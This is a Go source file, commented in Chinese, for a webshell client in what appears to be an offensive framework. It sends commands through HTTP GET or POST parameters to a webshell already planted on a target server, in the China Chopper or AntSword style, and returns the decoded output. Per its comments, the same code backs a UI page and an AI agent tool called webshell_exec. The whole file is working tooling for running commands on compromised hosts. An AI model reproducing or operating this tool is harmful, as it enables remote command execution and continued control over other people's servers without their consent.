// Package webshell 实现向目标 shell（HTTP 命令通道）发送命令并取回输出：
// 前端「Webshell」页与 agent 的 webshell_exec 工具共用同一执行逻辑。
package webshell

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/Autumn-27/artex/db"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/encoding/traditionalchinese"
	"golang.org/x/text/transform"
)

// 执行边界：单条命令的最长等待与最大输出字节数，防止失控请求拖垮服务。
const (
	DefaultTimeout = 30 * time.Second
	MaxTimeout     = 120 * time.Second
	MaxOutputBytes = 2 << 20
)

// Result 是一次命令执行的结论。Status: ok / error（网络失败或 HTTP 非 2xx）。
type Result struct {
	Output     string `json:"output"`
	Status     string `json:"status"`
	DurationMS int64  `json:"duration_ms"`
}

// Validate 校验一条 webshell 登记记录的必填与取值约束（agent 工具与服务端 API 共用）。
func Validate(name, urlStr, method, paramName string) error {
	if strings.TrimSpace(name) == "" {
		return fmt.Errorf("name 不能为空")
	}
	u, err := url.Parse(strings.TrimSpace(urlStr))
	if err != nil {
		return fmt.Errorf("url 无效: %v", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("url 仅支持 http/https")
	}
	if u.Host == "" {
		return fmt.Errorf("url 缺少主机名")
	}
	m := strings.ToUpper(strings.TrimSpace(method))
	if m != http.MethodGet && m != http.MethodPost {
		return fmt.Errorf("method 仅支持 GET/POST")
	}
	if strings.TrimSpace(paramName) == "" {
		return fmt.Errorf("param_name 不能为空")
	}
	return nil
}

// Exec 通过 ws 描述的 HTTP 命令通道执行 command 并返回输出。
// 命令本身不经过 shell，直接作为参数值发送——适用于菜刀/蚁剑类「参数=命令」的
// 最简 webshell；更复杂的协议（加密/分段）可在 UI 里用 headers/编码兜底。
func Exec(ctx context.Context, ws db.Webshell, command string, timeout time.Duration) Result {
	start := time.Now()
	if timeout <= 0 {
		timeout = DefaultTimeout
	}
	if timeout > MaxTimeout {
		timeout = MaxTimeout
	}
	runCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	method := strings.ToUpper(strings.TrimSpace(ws.Method))
	if method == "" {
		method = http.MethodPost
	}
	param := ws.ParamName
	if param == "" {
		param = "cmd"
	}

	var req *http.Request
	var err error
	if method == http.MethodGet {
		u, perr := url.Parse(ws.URL)
		if perr != nil {
			return fail(start, "URL 解析失败: "+perr.Error())
		}
		q := u.Query()
		q.Set(param, command)
		u.RawQuery = q.Encode()
		req, err = http.NewRequestWithContext(runCtx, http.MethodGet, u.String(), nil)
	} else {
		form := url.Values{}
		form.Set(param, command)
		req, err = http.NewRequestWithContext(runCtx, http.MethodPost, ws.URL, strings.NewReader(form.Encode()))
		if err == nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	}
	if err != nil {
		return fail(start, "构造请求失败: "+err.Error())
	}

	hasUA := false
	for k, v := range ws.Headers {
		req.Header.Set(k, v)
		if strings.EqualFold(k, "User-Agent") {
			hasUA = true
		}
	}
	if !hasUA {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ARTEX-Webshell/1.0")
	}

	resp, err := (&http.Client{Timeout: timeout}).Do(req)
	if err != nil {
		return fail(start, "请求失败: "+err.Error())
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, MaxOutputBytes))
	out := decodeBody(body, ws.Encoding)
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return Result{
			Output:     fmt.Sprintf("HTTP %d\n%s", resp.StatusCode, out),
			Status:     "error",
			DurationMS: time.Since(start).Milliseconds(),
		}
	}
	return Result{Output: out, Status: "ok", DurationMS: time.Since(start).Milliseconds()}
}

// decodeBody 按登记的编码把响应体转成 UTF-8；解码失败时退回原文。
func decodeBody(b []byte, encoding string) string {
	dec := func(t transform.Transformer) string {
		if s, _, err := transform.String(t, string(b)); err == nil {
			return s
		}
		return string(b)
	}
	switch strings.ToLower(strings.TrimSpace(encoding)) {
	case "gbk", "gb2312", "gbk2312":
		return dec(simplifiedchinese.GBK.NewDecoder())
	case "gb18030":
		return dec(simplifiedchinese.GB18030.NewDecoder())
	case "big5":
		return dec(traditionalchinese.Big5.NewDecoder())
	}
	return string(b)
}

func fail(start time.Time, msg string) Result {
	return Result{Output: msg, Status: "error", DurationMS: time.Since(start).Milliseconds()}
}
